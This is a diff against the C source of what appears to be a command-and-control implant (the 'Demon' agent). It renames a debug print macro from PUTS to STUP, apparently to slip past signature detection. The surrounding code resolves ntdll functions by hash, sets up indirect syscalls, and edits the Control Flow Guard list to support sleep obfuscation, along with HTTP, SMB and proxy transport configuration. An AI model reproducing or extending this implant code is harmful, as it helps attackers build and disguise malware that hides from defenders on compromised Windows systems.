@@ -299,11 +299,11 @@ VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
     Instance->Teb = NtCurrentTeb();
 
 #ifdef TRANSPORT_HTTP
-    PUTS( "TRANSPORT_HTTP" )
+    STUP( "TRANSPORT_HTTP" )
 #endif
 
 #ifdef TRANSPORT_SMB
-    PUTS( "TRANSPORT_SMB" )
+    STUP( "TRANSPORT_SMB" )
 #endif
 
 
@@ -373,7 +373,7 @@ VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
         Instance->Win32.NtQueryObject                     = LoaderFuncAdd( Instance->Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
         Instance->Win32.NtTraceEvent                      = LoaderFuncAdd( Instance->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
     } else {
-        PUTS( "Failed to load ntdll from PEB" )
+        STUP( "Failed to load ntdll from PEB" )
         return;
     }
 
@@ -479,7 +479,7 @@ VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
     {
         /* Initialize indirect syscalls + get SSN from every single syscall we need */
         if  ( ! SysInitialize( Instance->Modules.Ntdll ) ) {
-            PUTS( "Failed to Initialize syscalls" )
+            STUP( "Failed to Initialize syscalls" )
             /* NOTE: the agent is going to keep going for now. */
         }
     }
@@ -492,7 +492,7 @@ VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
     {
         /* load module */
         if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
-            PUTS( "Failed to load a module" )
+            STUP( "Failed to load a module" )
             return;
         }
     }
@@ -559,7 +559,7 @@ VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
      * to not raise an exception while performing sleep obfuscation */
     if ( CfgQueryEnforced() )
     {
-        PUTS( "Adding required function module &addresses to the cfg list"  );
+        STUP( "Adding required function module &addresses to the cfg list"  );
 
         /* common functions */
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtContinue );
@@ -743,7 +743,7 @@ VOID DemonConfig()
     Instance->Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
     if ( Instance->Config.Transport.Proxy.Enabled )
     {
-        PUTS( "[CONFIG] [PROXY] Enabled" );
+        STUP( "[CONFIG] [PROXY] Enabled" );
         Buffer = ParserGetBytes( &Parser, &Length );
         Instance->Config.Transport.Proxy.Url = MmHeapAlloc( Length + sizeof( WCHAR ) );
         MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
@@ -771,7 +771,7 @@ VOID DemonConfig()
     }
     else
     {
-        PUTS( "[CONFIG] [PROXY] Disabled" );
+        STUP( "[CONFIG] [PROXY] Disabled" );
     }
 #endif
 
